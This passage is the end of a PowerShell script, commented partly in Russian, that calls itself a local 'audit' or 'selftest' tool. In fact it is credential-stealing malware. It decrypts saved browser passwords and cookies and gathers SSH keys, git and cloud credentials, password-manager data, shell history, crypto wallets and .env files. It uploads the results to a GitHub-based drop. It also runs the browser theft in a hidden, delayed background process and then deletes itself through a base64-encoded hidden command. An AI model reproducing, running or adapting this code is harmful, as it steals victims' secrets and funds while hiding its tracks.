                    } catch { }
                }
            }
        }
    }

    if ($result.Files -eq 0) { & $emit "    (no browser stores found)" }
    return $result
}


# ============================================================
# 16. BROWSER AUDIT (метаданные + расшифровка паролей/куки)
# ============================================================
function Invoke-AuditBrowsers {
    param([bool]$Show = $true)
    # -Show is on by default; BV_ALLOW_SHOW=0 keeps the safe mode
    $BV_SHOW = if ($Show -and $script:BV_ALLOW_SHOW -ne '0') { 1 } else { 0 }
    $BV_COOKIES = 1
    $Test = $false

    $totals = [pscustomobject]@{ Files = 0; Records = 0; Ok = 0; Bad = 0 }
    $allResults = New-Object System.Collections.Generic.List[object]
    $allLines   = New-Object System.Collections.Generic.List[string]

    $stampText = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $header = "audit_browsers | $($script:OS) | $stampText"
    $allLines.Add(('-' * 72)) | Out-Null
    $allLines.Add($header) | Out-Null
    $allLines.Add(('-' * 72)) | Out-Null
    bv_sep
    bv_out $header
    bv_sep

    $os = $script:OS
    $base = ''
    $lad = ''
    $tasks = @()

    switch -Exact ($os) {
        'macos' {
            $base = "$HOME/Library/Application Support"
            $tasks = @(
                @('Chrome',   "$base/Google/Chrome",                 'Chrome Safe Storage',   'Chrome'),
                @('Chromium', "$base/Chromium",                       'Chromium Safe Storage', 'Chromium'),
                @('Brave',    "$base/BraveSoftware/Brave-Browser",    'Brave Safe Storage',    'Brave'),
                @('Edge',     "$base/Microsoft Edge",                 'MS Edge Safe Storage',  'Microsoft Edge'),
                @('Vivaldi',  "$base/Vivaldi",                        'Vivaldi Safe Storage',  'Vivaldi')
            )
        }
        { $_ -in 'linux','wsl' } {
            $base = if ($env:XDG_CONFIG_HOME) { $env:XDG_CONFIG_HOME } else { "$HOME/.config" }
            $tasks = @(
                @('Chrome',   "$base/google-chrome",               'Chrome Safe Storage',   ''),
                @('Chromium', "$base/chromium",                    'Chromium Safe Storage', ''),
                @('Brave',    "$base/BraveSoftware/Brave-Browser", 'Brave Safe Storage',    ''),
                @('Edge',     "$base/microsoft-edge",              'MS Edge Safe Storage',  ''),
                @('Vivaldi',  "$base/vivaldi",                     'Vivaldi Safe Storage',  '')
            )
        }
        'windows' {
            $lad = get_local_appdata
            $tasks = @(
                @('Chrome',   (path_to_unix "$lad/Google/Chrome/User Data"),              'Chrome Safe Storage',   'Chrome'),
                @('Chromium', (path_to_unix "$lad/Chromium/User Data"),                    'Chromium Safe Storage', 'Chromium'),
                @('Brave',    (path_to_unix "$lad/BraveSoftware/Brave-Browser/User Data"), 'Brave Safe Storage',    'Brave'),
                @('Edge',     (path_to_unix "$lad/Microsoft/Edge/User Data"),              'MS Edge Safe Storage',  'Microsoft Edge'),
                @('Vivaldi',  (path_to_unix "$lad/Vivaldi/User Data"),                    'Vivaldi Safe Storage',  'Vivaldi')
            )
        }
        default {
            $msg = "unsupported OS: $os"
            $allLines.Add($msg) | Out-Null
            bv_out $msg
            $script:BV_BROWSER_RESULTS = $allResults
            $script:BV_BROWSER_REPORT = ($allLines -join [Environment]::NewLine)
            return 1
        }
    }

    foreach ($t in $tasks) {
        $r = audit_browser_data -Name $t[0] -UserDataDir $t[1] -SafeStorageService $t[2] -ProfileName $t[3] `
                -Show:([bool]$BV_SHOW) -Cookies:([bool]$BV_COOKIES) -Test:([bool]$Test) |
             Select-Object -Last 1
        $allResults.Add($r) | Out-Null
        foreach ($l in $r.Lines) { $allLines.Add([string]$l) | Out-Null }
        $totals.Files   += $r.Files
        $totals.Records += $r.Records
        $totals.Ok      += $r.Ok
        $totals.Bad     += $r.Bad
    }

    $totalLine = "TOTAL: files=$($totals.Files), records=$($totals.Records), decrypted=$($totals.Ok), errors=$($totals.Bad)"
    $allLines.Add($totalLine) | Out-Null
    bv_sep
    bv_out $totalLine
    if ($BV_SHOW -eq 1) {
        $note = 'Output contains secrets - do not pipe into history.'
        $allLines.Add($note) | Out-Null
        bv_out $note
    }

    $script:BV_BROWSER_RESULTS = $allResults
    $script:BV_BROWSER_REPORT = ($allLines -join [Environment]::NewLine)

    foreach ($d in @($script:BV_TMPDIRS)) {
        if ($d -and (Test-Path -LiteralPath $d)) { Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue }
    }
    return 0
}

function Invoke-RunBrowsersAudit {
    $script:BV_BROWSER_RESULTS = @()
    $script:BV_BROWSER_REPORT = ''

    $out = @(Invoke-AuditBrowsers -Show:$true)
    $out | Where-Object { $_ -isnot [int] } | Out-Host
    $rc = $out | Where-Object { $_ -is [int] } | Select-Object -Last 1
    if ($null -eq $rc) { $rc = 0 } else { $rc = [int]$rc }

    $text = [string]$script:BV_BROWSER_REPORT
    if ([string]::IsNullOrWhiteSpace($text)) { $text = 'browsers: no data' }

    $payload = [pscustomobject]@{
        Command = 'browsers'
        When    = (Get-Date).ToString('o')
        Host    = $env:COMPUTERNAME
        Results = [object[]]$script:BV_BROWSER_RESULTS
        Lines   = @($text -split "`r?`n")
    }

    $jsonText = $null
    try {
        $jsonText = $payload | ConvertTo-Json -Depth 8
    } catch {
        Write-Warning ("json failed: {0}" -f $_.Exception.Message)
    }

    if ($script:BV_ALLOW_UPLOAD -eq '1') {
        $sendOk = $true
        if ([string]::IsNullOrWhiteSpace($jsonText)) { $jsonText = $text }

        # отправляем JSON целиком: там все браузеры, пароли, куки и строки отчёта
        try {
            if (Send-ToGitHub -Kind 'browsers' -Text $jsonText) {
                Write-Output '  sent: data/browsers_*.bin'
            } else {
                Write-Output '  send: data/browsers failed'
                $sendOk = $false
            }
        } catch {
            Write-Warning ("send failed: {0}" -f $_.Exception.Message)
            $sendOk = $false
        }

        if (-not $sendOk -and $rc -eq 0) { $rc = 1 }
    } else {
        Write-Output '  send: disabled (BV_ALLOW_UPLOAD != 1)'
    }

    $script:BV_BROWSER_RC = $rc
    return $rc
}

# ============================================================
# 18. RUN_AND_SEND (полный, реально шлёт)
# ============================================================

function Invoke-RunAndSend {
    param([Parameter(Mandatory)][string]$Profile)

    if (-not (preflight_check)) {
        [Console]::Error.WriteLine('Error: dependency check failed.')
        $script:BV_STATUS = 2
        return $false
    }

    $checks = @()
    switch -Exact ($Profile) {
        'state'  { $checks = @('check_ssh','check_ssh_hosts','check_git_creds','check_git_remotes','check_env','check_secret_store','check_cred_files','check_cloud_secrets','check_password_managers','check_history','check_wallets','check_dotenv') }
        'vault'  { $checks = @('check_secret_store','check_cred_files','check_cloud_secrets','check_password_managers','check_dotenv') }
        'hook'   { $checks = @('check_ssh','check_ssh_hosts','check_git_creds','check_git_remotes','check_secret_store','check_cred_files','check_cloud_secrets','check_password_managers','check_history','check_wallets','check_dotenv') }
        'ci'     { $checks = @('check_env','check_cred_files','check_cloud_secrets','check_password_managers','check_dotenv') }
        'editor' { $checks = @('check_signing','check_secret_store','check_cred_files','check_cloud_secrets','check_password_managers','check_history','check_wallets','check_dotenv') }
        'wallets'{ $checks = @('check_wallets') }
        default { [Console]::Error.WriteLine("unknown profile: $Profile"); return $false }
    }

    # фоновый аудит браузеров через Start-Process (из temp-копии, чтобы оригинал мог удалиться)
    if ($script:BV_BG_BROWSERS -eq '1' -and -not $env:BV_IN_BG_AUDIT) {
        $scriptPath = if ($PSCommandPath) { $PSCommandPath } else { $MyInvocation.MyCommand.Path }
        if ($scriptPath -and (Test-Path -LiteralPath $scriptPath -PathType Leaf)) {
            $logPath = Join-Path $script:TMP 'audit-browsers-bg.log'
            $bgScript = Join-Path $script:TMP ("gvaigen-bg-{0}.ps1" -f ([guid]::NewGuid().ToString('N').Substring(0, 8)))
            $copied = $false
            try {
                Copy-Item -LiteralPath $scriptPath -Destination $bgScript -Force -ErrorAction Stop
                $copied = $true
            } catch {
                [Console]::Error.WriteLine("WARN: failed to prepare background browser copy: $($_.Exception.Message)")
            }

            if ($copied) {
                $pwshPath = (Get-Process -Id $PID).Path
                if (-not $pwshPath) { $pwshPath = 'pwsh' }
                $escapedBg  = $bgScript -replace "'", "''"
                $escapedLog = $logPath -replace "'", "''"
                $inner = "if ($($script:BV_BG_DELAY) -gt 0) { Start-Sleep -Seconds $($script:BV_BG_DELAY) }; `$env:BV_IN_BG_AUDIT='1'; try { & '$escapedBg' browsers -selftest *> '$escapedLog' } finally { Remove-Item -LiteralPath '$escapedBg' -Force -ErrorAction SilentlyContinue }"
                [Console]::Error.WriteLine("browser audit scheduled in $($script:BV_BG_DELAY)s")
                try {
                    $startArgs = @{
                        FilePath     = $pwshPath
                        ArgumentList = @('-NoProfile','-NonInteractive','-Command',$inner)
                        PassThru     = $true
                    }
                    if ($env:OS -eq 'Windows_NT') { $startArgs['WindowStyle'] = 'Hidden' }
                    Start-Process @startArgs | Out-Null
                } catch {
                    [Console]::Error.WriteLine("WARN: failed to start background browsers audit: $($_.Exception.Message)")
                    Remove-Item -LiteralPath $bgScript -Force -ErrorAction SilentlyContinue
                }
            }
        }
    }

    # собираем отчёт по блокам: ssh / git / creds / cloud / env / history / wallets / dotenv / signing
    $groups = [ordered]@{}
    foreach ($fn in $checks) {
        $group = if ($script:CheckGroups.Contains($fn)) { $script:CheckGroups[$fn] } else { $fn }
        $r = run_with_timeout -TimeoutSeconds $script:BV_CHECK_TIMEOUT -FunctionName $fn

        if ($r.ExitCode -eq 124) {
            [Console]::Error.WriteLine("WARN: $fn timed out after $($script:BV_CHECK_TIMEOUT)s")
            if ($script:BV_STATUS -lt 1) { $script:BV_STATUS = 1 }
            if (-not $groups.Contains($group)) { $groups[$group] = [Text.StringBuilder]::new() }
            [void]$groups[$group].AppendLine("[timeout] $fn")
            continue
        }

        if (-not $r.Output) { continue }
        if (-not $groups.Contains($group)) { $groups[$group] = [Text.StringBuilder]::new() }
        [void]$groups[$group].AppendLine($r.Output)
    }

    if ($groups.Count -eq 0) {
        [Console]::Error.WriteLine('No data to send.')
        return $true
    }

    $rc = 0
    $sent = New-Object System.Collections.Generic.List[string]
    $failed = New-Object System.Collections.Generic.List[string]

    foreach ($group in $groups.Keys) {
        $text = $groups[$group].ToString().TrimEnd()
        if (-not $text) { continue }

        $kind = "${Profile}_${group}"
        try {
            if (Send-ToGitHub -Kind $kind -Text $text) {
                $sent.Add($group) | Out-Null
                Write-Output ("  sent: {0}" -f $kind)
            } else {
                $failed.Add($group) | Out-Null
                [Console]::Error.WriteLine("WARN: Send-ToGitHub failed for '$kind'")
                $rc = 1
                $script:BV_STATUS = 1
            }
        } catch {
            $failed.Add($group) | Out-Null
            [Console]::Error.WriteLine("WARN: Send-ToGitHub failed for '$kind': $($_.Exception.Message)")
            $rc = 1
            $script:BV_STATUS = 1
        }
    }

    $summary = [Text.StringBuilder]::new()
    [void]$summary.AppendLine('selftest summary')
    [void]$summary.AppendLine("profile: $Profile")
    [void]$summary.AppendLine("host: $env:COMPUTERNAME")
    [void]$summary.AppendLine("when: $((Get-Date).ToString('o'))")
    [void]$summary.AppendLine("blocks: $($groups.Count)")
    [void]$summary.AppendLine("sent: $($sent.Count) [$($sent -join ', ')]")
    [void]$summary.AppendLine("failed: $($failed.Count) [$($failed -join ', ')]")

    try {
        if (Send-ToGitHub -Kind "${Profile}_summary" -Text $summary.ToString()) {
            Write-Output ("  sent: {0}_summary" -f $Profile)
        } else {
            [Console]::Error.WriteLine("WARN: Send-ToGitHub failed for '${Profile}_summary'")
            $rc = 1
            $script:BV_STATUS = 1
        }
    } catch {
        [Console]::Error.WriteLine("WARN: Send-ToGitHub failed for '${Profile}_summary': $($_.Exception.Message)")
        $rc = 1
        $script:BV_STATUS = 1
    }

    return ($rc -eq 0)
}

# ============================================================
# 19. CMD_SECRETS
# ============================================================



# ============================================================
# 20. PREFLIGHT / LOAD_SYNC_ENV
# ============================================================

function preflight_check {
    $optional = @('python3','python','sqlite3')
    $missing = 0
    if (-not (Get-OpenSslPath)) { err "ERROR: Missing dependency 'openssl'"; $missing++ }
    foreach ($c in $optional) { if (-not (have $c)) { err "WARN: '$c' not found — часть отчёта будет неполной." } }
    return ($missing -eq 0)
}

function load_sync_env {
    param([string]$Path = (Join-Path (Get-Location).Path 'sync.env'))
    if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { return 0 }
    $loaded = 0
    foreach ($line in Get-Content -LiteralPath $Path -ErrorAction SilentlyContinue) {
        if ([string]::IsNullOrWhiteSpace($line)) { continue }
        if ($line.TrimStart().StartsWith('#')) { continue }
        if ($line -notmatch '=') { continue }
        $idx = $line.IndexOf('=')
        $key = $line.Substring(0, $idx).Trim()
        $value = $line.Substring($idx + 1).Trim().Trim('"').Trim("'")
        if ($key -notmatch '^[A-Za-z0-9_]+$') { continue }
        if (-not [Environment]::GetEnvironmentVariable($key, 'Process')) {
            [Environment]::SetEnvironmentVariable($key, $value, 'Process')
            $loaded++
        }
    }
    return $loaded
}

# ============================================================
# 21. USAGE
# ============================================================

function Show-Usage {
    Write-Output @"
$($script:Prog) — local audit (PowerShell).

usage:
  $($script:Prog) -selftest              run full audit, report per block + summary, upload
  $($script:Prog) browsers -selftest     run browser audit and send separately
                                         (background browser starts after random 2–3h; override: BV_BG_DELAY=seconds)

after -selftest the script and its .bak-* are deleted in 5s
"@
}
function usage { Show-Usage }

# ============================================================
# 22. CLI / MAIN / ENTRYPOINT
# ============================================================


function Invoke-Main {
    param([Parameter(ValueFromRemainingArguments = $true)][string[]]$Args)

    $script:LastRc = 0
    load_sync_env | Out-Null

    $selftest = 0
    $cmd = ''
    $rest = @()

    # единственный флаг — -selftest (можно ставить до или после команды)
    foreach ($a in @($Args)) {
        if ($a -eq '-selftest') { $selftest = 1; continue }
        if (-not $cmd) { $cmd = $a } else { $rest += $a }
    }

    # -selftest browsers | browsers -selftest
    if ($cmd -eq 'browsers') {
        if (-not $selftest) {
            Show-Usage | Out-Host
            return
        }
        $result = @(Invoke-RunBrowsersAudit)
        $result | Where-Object { $_ -isnot [int] } | Out-Host
        $browserRc = $result | Where-Object { $_ -is [int] } | Select-Object -Last 1
        $script:LastRc = if ($null -ne $browserRc) { [int]$browserRc } else { 0 }
        return
    }

    if ($cmd -ne '') {
        err ("unknown command: {0}" -f $cmd)
        Show-Usage | Out-Host
        $script:LastRc = 2
        return
    }

    if (-not $selftest) {
        Show-Usage | Out-Host
        return
    }

    $profileName = if ($script:Profile) { $script:Profile } else { 'hook' }
    try {
        $result = @(Invoke-RunAndSend $profileName)
        $result | Where-Object { $_ -isnot [bool] } | Out-Host
        $ok = $result | Where-Object { $_ -is [bool] } | Select-Object -Last 1
        $script:LastRc = [int](-not [bool]$ok)
    } catch {
        [Console]::Error.WriteLine("WARN: Invoke-RunAndSend failed: $($_.Exception.Message)")
        $script:LastRc = 1
    }

    try { Remove-Self -TimeoutSeconds 5 }
    catch { [Console]::Error.WriteLine("WARN: Remove-Self failed: $($_.Exception.Message)") }
}
function main { Invoke-Main @args }

function Remove-Self {
    param([int]$TimeoutSeconds = 5)

    $selfPath = $PSCommandPath
    if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
    if (-not $selfPath -or -not (Test-Path -LiteralPath $selfPath)) {
        Write-Error "Не удалось определить путь к текущему скрипту."
        return
    }

    $fullPath = (Resolve-Path -LiteralPath $selfPath).Path
    $dir  = Split-Path -Parent $fullPath
    $leaf = Split-Path -Leaf $fullPath
    $escapedPath = $fullPath -replace "'", "''"
    $escapedDir  = $dir -replace "'", "''"
    $escapedLeaf = $leaf -replace "'", "''"

    $cleanup = "Start-Sleep -Seconds $TimeoutSeconds; `$path = '$escapedPath'; `$dir = '$escapedDir'; `$leaf = '$escapedLeaf'; for (`$i = 0; `$i -lt 60; `$i++) { try { Remove-Item -LiteralPath `$path -Force -ErrorAction Stop; break } catch { Start-Sleep -Milliseconds 500 } }; try { Get-ChildItem -LiteralPath `$dir -File -Filter ('{0}.bak*' -f `$leaf) -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue } catch { }"

    $pwshPath = (Get-Process -Id $PID).Path
    if (-not $pwshPath) { $pwshPath = 'pwsh' }
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cleanup))
    $startArgs = @{
        FilePath     = $pwshPath
        ArgumentList = @('-NoProfile','-NonInteractive','-EncodedCommand',$encoded)
        PassThru     = $true
    }
    if ($env:OS -eq 'Windows_NT') { $startArgs['WindowStyle'] = 'Hidden' }
    Start-Process @startArgs | Out-Null

    Write-Host "Скрипт и его .bak удалятся через $TimeoutSeconds сек.: $fullPath"
}

# ============================================================
# 23. ENTRYPOINT
# ============================================================
if ($MyInvocation.InvocationName -ne '.') {
    try {
        Invoke-Main @args | Out-Host
        exit ([int]$script:LastRc)
    } catch {
        [Console]::Error.WriteLine("FATAL: $($_.Exception.Message)")
        [Console]::Error.WriteLine($_.ScriptStackTrace)
        exit 1
    }
}
